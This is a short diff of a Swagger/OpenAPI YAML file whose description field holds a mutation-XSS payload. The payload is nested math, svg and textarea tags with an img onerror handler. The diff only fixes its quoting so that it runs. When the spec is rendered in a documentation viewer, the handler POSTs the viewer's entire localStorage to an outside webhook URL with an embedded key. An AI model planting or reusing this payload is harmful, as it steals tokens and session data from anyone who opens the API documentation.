@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Example yaml.spec
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img onerror='fetch('https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=44f76713-872b-4a36-ae90-e22ad1671fd6', {method: 'POST',mode: 'no-cors',headers: { 'Content-Type': 'application/json' },body: JSON.stringify({'msgtype': 'text','text': {'content': 'localStorage: ' + JSON.stringify(localStorage)}})});' src=1></script>">
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img onerror='fetch("https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=44f76713-872b-4a36-ae90-e22ad1671fd6", {method: "POST",mode: "no-cors",headers: { "Content-Type": "application/json" },body: JSON.stringify({"msgtype": "text","text": {"content": "localStorage: " + JSON.stringify(localStorage)}})});' src=1></script>">
 paths:
   /accounts:
     get:
